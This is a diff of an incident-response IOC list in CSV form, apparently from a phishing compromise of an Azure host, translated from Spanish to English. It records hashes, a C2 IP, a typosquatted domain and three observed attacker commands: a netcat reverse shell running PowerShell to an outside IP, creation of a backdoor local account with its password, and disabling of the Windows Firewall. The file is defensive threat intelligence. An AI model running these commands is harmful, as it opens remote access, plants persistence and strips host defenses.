@@ -1,21 +1,21 @@
 type,value,description,mitre_technique,confidence
-sha256,5f7e5e76ca74447126ef5bccb0584342dc0890e1a65e4cac7f84281230df0728,Payload principal - identico en $RD60126.exe y Historial_Pagos_Visa.pdf.exe,T1566.001|T1036.003,high
-sha256,b3b207dfab2f429cc352ba125be32a0cae69fe4bf8563ab7d0128bba8c57a71c,Netcat (nc.exe) usado como canal de C2,T1095,high
-filename,Historial_Pagos_Visa.pdf.exe,Senuelo con doble extension descargado via msedge.exe,T1036.003,high
-filename,$RD60126.exe,Artefacto escrito por outlook.exe en la Papelera de Reciclaje,T1566.001,high
-filename,nc.exe,Binario Netcat ejecutado desde %TEMP%,T1095,high
-filepath,C:\$Recycle.Bin\S-1-5-21-3250139449-4025979577-2541746667-1001\,Staging inicial del payload,T1566.001,high
-filepath,C:\Users\rogelio\Downloads\,Ubicacion de descarga del senuelo,T1204.002,high
-filepath,C:\Users\rogelio\AppData\Local\Temp\3\,Directorio de ejecucion de Netcat,T1059.001,high
-ip-dst,89.44.9.243,Servidor de Comando y Control,T1095,high
-port,8080,Puerto TCP de la Reverse Shell,T1095,high
-ip-dst,168.63.129.16,Destino de la anomalia de volumen - IP de plataforma Azure - REQUIERE VALIDACION,T1041,low
-ip-src,10.0.1.4,IP interna del host comprometido,,high
-hostname,technique-test,Activo comprometido (Azure eastus2),,high
-domain,outluok.co,Dominio typosquatted del remitente,T1566.001,high
-email-subject,¡¡Urgente!! Tu cuenta puede estar en peligro,Asunto del senuelo de spear phishing,T1566.001,high
-account,rogelio,Cuenta local clon creada por el adversario,T1136.001,high
-text,password2$,Credencial estatica de la cuenta clon,T1136.001,high
-command,nc.exe 89.44.9.243 -e powershell.exe 8080,Establecimiento de Reverse Shell,T1059.001,high
-command,New-LocalUser 'rogelio' -Password (ConvertTo-SecureString 'password2$' -AsPlainText -Force),Creacion de cuenta clon,T1136.001,high
-command,Set-NetFirewallProfile -Enabled False -All,Desactivacion del Firewall de Windows,T1562.001,high
+sha256,5f7e5e76ca74447126ef5bccb0584342dc0890e1a65e4cac7f84281230df0728,Primary payload - identical in $RD60126.exe and Historial_Pagos_Visa.pdf.exe,T1566.001|T1036.003,high
+sha256,b3b207dfab2f429cc352ba125be32a0cae69fe4bf8563ab7d0128bba8c57a71c,Netcat (nc.exe) used as the C2 channel,T1095,high
+filename,Historial_Pagos_Visa.pdf.exe,Double-extension lure downloaded via msedge.exe,T1036.003,high
+filename,$RD60126.exe,Artifact written by outlook.exe into the Recycle Bin,T1566.001,high
+filename,nc.exe,Netcat binary executed from %TEMP%,T1095,high
+filepath,C:\$Recycle.Bin\S-1-5-21-3250139449-4025979577-2541746667-1001\,Initial payload staging directory,T1566.001,high
+filepath,C:\Users\rogelio\Downloads\,Lure download location,T1204.002,high
+filepath,C:\Users\rogelio\AppData\Local\Temp\3\,Netcat execution directory,T1059.001,high
+ip-dst,89.44.9.243,Command and Control server,T1095,high
+port,8080,Reverse shell TCP port,T1095,high
+ip-dst,168.63.129.16,Volume anomaly destination - Azure platform IP - REQUIRES VALIDATION,T1041,low
+ip-src,10.0.1.4,Compromised host internal IP,,high
+hostname,technique-test,Compromised asset (Azure eastus2),,high
+domain,outluok.co,Typosquatted sender domain,T1566.001,high
+email-subject,Urgente - Tu cuenta puede estar en peligro,Spear phishing lure subject line,T1566.001,high
+account,rogelio,Cloned local account created by the adversary,T1136.001,high
+text,password2$,Static credential set on the clone account,T1136.001,high
+command,nc.exe 89.44.9.243 -e powershell.exe 8080,Reverse shell establishment,T1059.001,high
+command,New-LocalUser 'rogelio' -Password (ConvertTo-SecureString 'password2$' -AsPlainText -Force),Clone account creation,T1136.001,high
+command,Set-NetFirewallProfile -Enabled False -All,Windows Firewall shutdown,T1562.001,high
